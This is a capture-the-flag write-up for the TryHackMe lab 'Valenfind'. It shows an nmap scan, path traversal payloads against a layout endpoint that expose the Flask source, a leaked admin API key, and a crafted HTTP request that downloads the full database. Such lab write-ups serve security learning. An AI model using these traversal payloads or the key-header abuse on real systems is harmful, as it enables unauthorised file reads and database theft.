# TryHackMe Valenfind Writeup

---

## Nmap Scan

```
nmap -sCV -Pn 10.67.144.115
```

<img width="1308" height="439" alt="image" src="https://github.com/user-attachments/assets/54f46165-0ef7-47c7-b9d8-bd4776ab3a14" />

---

## start navigate website and found this endpoint

```
/api/fetch_layout?layout=theme_classic.html
```

> ## i ask my self why not path travesal and boom 

<img width="1460" height="680" alt="image" src="https://github.com/user-attachments/assets/9ae8ac74-5691-4f0c-afc8-f5a8267fab15" />

## good now let's try to see flask files **`app.py`**

```
/api/fetch_layout?layout=../../../../../../app.py
```

<img width="1587" height="316" alt="image" src="https://github.com/user-attachments/assets/d2ffc17f-891c-4a76-82c5-efb88624a0d1" />

```
Error loading theme layout: [Errno 2] No such file or directory: '/opt/Valenfind/templates/components/../../../../../../app.py'
```

## good i will try and look what i found

```
/api/fetch_layout?layout=../../../../../../opt/Valenfind/app.py
```

<img width="1614" height="638" alt="image" src="https://github.com/user-attachments/assets/a6c0340b-2a61-4955-a2b2-a32bdbc60431" />

```
ADMIN_API_KEY = "CUPID_MASTER_KEY_2024_XOXO"
DATABASE = 'cupid.db'
```

<img width="836" height="462" alt="image" src="https://github.com/user-attachments/assets/110db52e-3d05-4bb6-9ef7-b344c61dfe6d" />

```
X-Valentine-Token
```

```python
@app.route('/api/admin/export_db')
def export_db():
    auth_header = request.headers.get('X-Valentine-Token')
    
    if auth_header == ADMIN_API_KEY:
        return send_file(DATABASE, as_attachment=True)
```

📌 means:

You don't need to login

You don't need a session

But API KEY

The database will return to you in full 🤯

```
/api/admin/export_db
```

```
GET /api/admin/export_db HTTP/1.1
Host: 10.67.144.115:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://10.67.144.115:5000/profile/casanova_official
Connection: keep-alive
X-Valentine-Token: CUPID_MASTER_KEY_2024_XOXO
Cookie: session=eyJsaWtlZCI6WzJdLCJ1c2VyX2lkIjo5LCJ1c2VybmFtZSI6ImFkbWluIn0.aZH6wA.jWsdrTyww8bYCwMr1IHchmaaCck
Priority: u=4

```

## found the flag

<img width="1508" height="601" alt="image" src="https://github.com/user-attachments/assets/32b4e89f-138c-46be-8f9f-7cc9531041c7" />

